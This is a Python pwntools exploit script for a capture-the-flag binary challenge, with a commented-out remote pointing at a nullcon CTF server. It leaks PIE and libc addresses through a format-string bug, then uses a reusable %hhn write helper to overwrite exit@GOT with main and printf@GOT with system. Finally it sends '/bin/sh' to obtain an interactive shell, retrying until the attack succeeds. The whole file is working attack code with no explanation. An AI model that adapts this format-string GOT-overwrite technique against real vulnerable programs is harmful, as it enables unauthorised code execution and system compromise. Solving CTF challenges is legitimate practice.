from pwn import * 

from binascii import unhexlify , hexlify





context.clear(arch='amd64') 



def get_PIE(proc):

    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()

    return int(memory_map[0].split("-")[0],16)



def get_libc(proc):

    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()

    return int(memory_map[3].split("-")[0], 16) 





def debug(bp):

    #bp = [0xea0,0xd31,0xc52]

    #bp = [0x00000dfb,0x00000b7c,0x00000d10]

    script = ""

    PIE = get_PIE(p)

    PAPA = PIE

    for x in bp:

        script += "b *0x%x\n"%(PIE+x)

    gdb.attach(p,gdbscript=script) 



# context.terminal = ['tmux', 'splitw', '-h']

def send_payload(payload) : 

    log.info("payload = %s" % repr(payload))

    p.send(payload) 



def format_write(addr, value) : 

    payload = '' 

    old_c = 0 



    for i in range(len(value)) : 

        new_c = value[i]  

        if new_c > old_c : 

            res = new_c - old_c 

        else : 

            res = 256 + new_c - old_c

        old_c = new_c 

        payload += '%' + str(res) + 'c' + '%' + '{}$hhn'

    payload += '0' * (8 - len(payload) % 8)

    t = len(payload)

    offset = len(payload) / 8 + 6

    # print(len(payload) )

    # print(tuple(offset + i for i in range(len(value))))

    payload = payload.format(*[offset + i for i in range(len(value))] )

    for i in range(8) : 

        payload += p64(addr + i)

    return payload 



with context.verbose :

    count = 0 

    while True :

        count += 1 

        if count > 60 : 

            break  

        p = process('./challenge')#, env={'LD_PRELOAD' : 'libc-2.23.so'}) 

        l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 



        # p = remote('pwn2.ctf.nullcon.net', 5003)

        # LIBC = 

        libc = (get_libc(p) & 0xffff) + 0x1ab0 + 224 



        print(hex(libc)) 

        # debug([0x97f, 0x94A])

        p.send(str((1<<64) - 1))

        v17 = (1<<63)

        p.sendline(str(0x280 + v17))

        p.send('%30$p' + 'a' * 131 + '\x90\x3b') #unhexlify(hex(libc)[2:])[::-1])  

         

        data = p.recv()

        PIE = int(data[2:14], 16) - 0x750 

        LIBC = int(hexlify(data[-6:][::-1]), 16) - 0x21ab0 - 224

        # assert (LIBC + 0x1c70) & 0xfff == 0xc70  

        gadget_addr = [0x45216,0x4526a,0xf02a4,0xf1147]

        exit_got = PIE + 0x201018

        one_gadget = LIBC + gadget_addr[0]

        log.success('PIE = ' + hex(PIE))

        log.success("LIBC = " + hex(LIBC)) 

        # p.interactive()

        # stage 2 : format string 

        # payload = '' 

        # old_c = 0 



        # for i in range(8) : 

        #     new_c = (one_gadget >> (i * 8)) % 256 

        #     if new_c > old_c : 

        #         res = new_c - old_c 

        #     else : 

        #         res = 256 + new_c - old_c

        #     old_c = new_c 

        #     payload += '%' + str(res) + 'c' + '%' + '{}$hhn'

        # payload += '0' * (8 - len(payload) % 8)

        # t = len(payload)

        # offset = len(payload) / 8 + 6

        # # print(len(payload) )

        # payload = payload.format(offset, offset + 1, offset + 2, offset+3, offset+4, offset+5, offset+6, offset+7) 



        # for i in range(8) : 

        #     payload += p64(exit_got + i)

        # p.interactive()

        value = []

        main = PIE + 0x880

        for i in range(8) : 

            value.append((main >> (i * 8)) % 256)  

        payload = format_write(exit_got, value)

        print(repr(payload))

        assert len(payload) <= 200

        p.send(payload)



        # p.send('%' + str(one_gadget & 0xffff) + '%7$p_%8$p_%9$p_aaaa' + p64(exit_got) + p64(exit_got+4) + p64(exit_got + 8))

        try : 

            print(repr(p.recv())) 

            log.success('EXIT_GOT = ' + hex(exit_got))

            log.success("MAIN = " + hex(main))



            printf_got = PIE + 0x201028 

            system = LIBC + l.symbols['__libc_system'] 

            value = [] 

            for i in range(8) : 

                value.append((system >> (i * 8)) % 256) 

            payload = format_write(printf_got, value)

            p.send(payload) 

            p.recv() 



            p.send('/bin/sh\x00')

            p.interactive()

            break 

        # p.interactive()

        except : 

            p.close()

            pass

# 0x00007f08acbdfb84 <+212>:	mov    rsi,QWORD PTR [rsp+0x8]

#    0x00007f08acbdfb89 <+217>:	mov    edi,DWORD PTR [rsp+0x14]

#    0x00007f08acbdfb8d <+221>:	mov    rdx,QWORD PTR [rax]

#    0x00007f08acbdfb90 <+224>:	mov    rax,QWORD PTR [rsp+0x18]

#    0x00007f08acbdfb95 <+229>:	call   rax
